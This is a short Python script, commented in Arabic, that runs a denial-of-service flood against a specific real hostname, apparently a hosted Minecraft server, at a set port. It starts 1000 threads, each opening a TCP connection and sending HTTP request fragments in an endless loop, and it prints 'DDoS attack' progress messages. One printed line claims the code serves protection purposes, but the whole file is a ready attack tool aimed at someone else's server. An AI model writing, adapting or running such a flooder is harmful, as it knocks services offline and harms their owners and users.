import socket
import threading
import time
from colorama import Fore, init

# تهيئة مكتبة colorama لاستخدام الألوان
init(autoreset=True)

# إعدادات الخادم
ip = "FronzFR.aternos.me"
port = 49208
num_threads = 1000  # عدد الخيوط (threads) لمحاكاة حركة المرور

# دالة لإرسال الطلبات إلى الخادم
def attack(ip, port):
    try:
        # إنشاء سوكيت للاتصال بالخادم
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # مهلة الاتصال
        
        # محاولة الاتصال بالخادم
        sock.connect((ip, port))
        
        # إرسال طلبات بشكل متكرر (محاكاة الهجوم)
        while True:
            sock.sendto(b"GET / HTTP/1.1\r\n", (ip, port))

    except Exception as e:
        print(f"[!] Error occurred: {e}")

# دالة لبدء الهجوم باستخدام خيوط متعددة
def start_attack(ip, port, num_threads):
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(ip, port))
        threads.append(thread)
        thread.start()
        
    # انتظار حتى انتهاء جميع الخيوط
    for thread in threads:
        thread.join()

# الدالة لبدء الهجوم وإرسال الرسائل
def start_ddos_attack():
    print(Fore.GREEN + "[+] Attack started...")  # إرسال رسالة البدء
    start_time = time.time()

    # إرسال رسالة كل 10 ثوانٍ أثناء الهجوم
    while True:
        print(Fore.GREEN + "[+] Attack is ongoing...")  # إرسال رسالة مستمرة
        time.sleep(10)  # انتظر 10 ثوانٍ قبل إرسال الرسالة التالية

# تشغيل الاختبار
if __name__ == "__main__":
    print("الكود للأغراض حماية")
    print(f"[+] Starting DDoS attack simulation on {ip}:{port} with {num_threads} threads")
    
    # بدء الهجوم في خيوط متعددة
    attack_thread = threading.Thread(target=start_attack, args=(ip, port, num_threads))
    attack_thread.start()

    # بدء إرسال الرسائل المتكررة
    start_ddos_attack()

    attack_thread.join()  # انتظر حتى تنتهي الخيوط
    print(f"[+] Attack finished!") 